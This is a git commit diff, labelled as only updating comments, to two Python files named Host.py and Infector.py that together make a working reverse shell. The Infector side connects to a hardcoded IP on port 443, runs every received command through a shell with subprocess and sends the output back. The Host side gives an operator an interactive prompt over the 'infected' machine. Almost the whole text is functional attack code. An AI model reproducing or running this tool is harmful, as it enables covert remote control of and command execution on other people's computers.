c11f9bbd3bc8f187782b00f37cb351d065ca9330
red2922 <jinthavongsa1@gmail.com>
2023-05-12 00:41:45 -0500

    Updated Comments

--- Host.py
+++ Host.py
@@ -14,32 +14,32 @@ b_mess = bytes(message, 'ascii')
 SEP = "<sep>"
 
 s = socket.socket()  #Creating a socket 
-s.bind((Host,Port)) # binds the host IP to port 
+s.bind((Host,Port))  #binds the host IP to port 
 
 
-s.listen(5)                 #Waits 5 minutes for a connection before ending
+s.listen(5)                                #Waits 5 minutes for a connection before ending
 print(f"Listening as {Host}:{Port} ...") #Tells the use what IPs to listen and port it is listening on 
 
 infected, client_address = s.accept()       #Accepts connection from Infected and stores Infected as the IP address and client_address as the port
-infected.send(b_mess) #Sends a message to infected. Not currently working. Pls convert to byte
+infected.send(b_mess)                       #Sends a message to infected. Not currently working. Pls convert to byte
 print(f"{client_address[0]}:{client_address[1]} Connected!") #Tells the user who connected
 
 pwd = infected.recv(Size).decode()#Decodes the message from Infector. Should be the pwd
-print("Current working directory: ",pwd)
+print("Current working directory: ",pwd) #prints the initial directory you are starting in 
 
 while True:
 
-    command = input(f"{pwd} $> ")
+    command = input(f"{pwd} $> ") #prints out a working directory in command like structure
 
     if 'exit' in command :
-        s.close()
+        s.close()                       #will close and stop host server. 
 
-    elif command[:2] == 'cd':
+    elif command[:2] == 'cd':           
         infected.send(command.encode())
-        pwd = infected.recv(Size).decode()
+        pwd = infected.recv(Size).decode()  #making so pwd when changing directories
 
     else:
-        infected.send(command.encode())
-        print (infected.recv(Size).decode())
+        infected.send(command.encode())        #sends the command string and then encodes it so can be sent 
+        print (infected.recv(Size).decode())    #decodes incoming binary streams into strings. 
 
 
--- Infector.py
+++ Infector.py
@@ -3,9 +3,9 @@ import os
 import subprocess
 import sys
 
-#run this side in linux
+#run this side in 
 
-s = socket.socket()
+s = socket.socket() # Begins Socket Server
 
 Name = socket.gethostname() #Gets name of Device
 Host = socket.gethostbyname("localhost")  #Gets the IPV4 Address of the Device
@@ -14,30 +14,30 @@ Host = socket.gethostbyname("localhost")  #Gets the IPV4 Address of the Device
 Port = 443
 Size = 1024 * 128 # 128KB max size of messages, feel free to increase
 
-empty_mess = "There is nothing in this directory or this command doesn't return a value"
+#empty_mess = "There is nothing in this directory or this command doesn't return a value"
 
 # connect to the server
 s.connect(('10.67.98.152', Port)) #Your Local IP Here. Should change to host variable at onepoint. Currently only can connect if host is exact
 
 confirm = s.recv(Size).decode()
-print(confirm)
+print(confirm)   #Debugging. Will print a message if successfully connected (From Infected Side)
 
 cwd = os.getcwd() #Sets cwd to os.getcwd()
 s.send(cwd.encode()) #Sends the cwd to the Host
 
 #Need to make it so you can just type in commands and allows to do almost anything. 
 while True:
-    command = s.recv(Size).decode()
+    command = s.recv(Size).decode()     
 
     if  command.startswith("cd "):
-        os.chdir(str(command[3:]))
-        s.send(os.getcwd().encode())
+        os.chdir(str(command[3:]))  #Force change dir with built in OS function 
+        s.send(os.getcwd().encode()) 
+
     else:
         CMD = subprocess.Popen(command, shell = True, stdout=subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE)
-        s.send(CMD.stderr.read())
+        s.send(CMD.stderr.read()) #No encodeing needed due to .stderr and .stdout read as binary 
         s.send(CMD.stdout.read())
         
-   
         
         
 
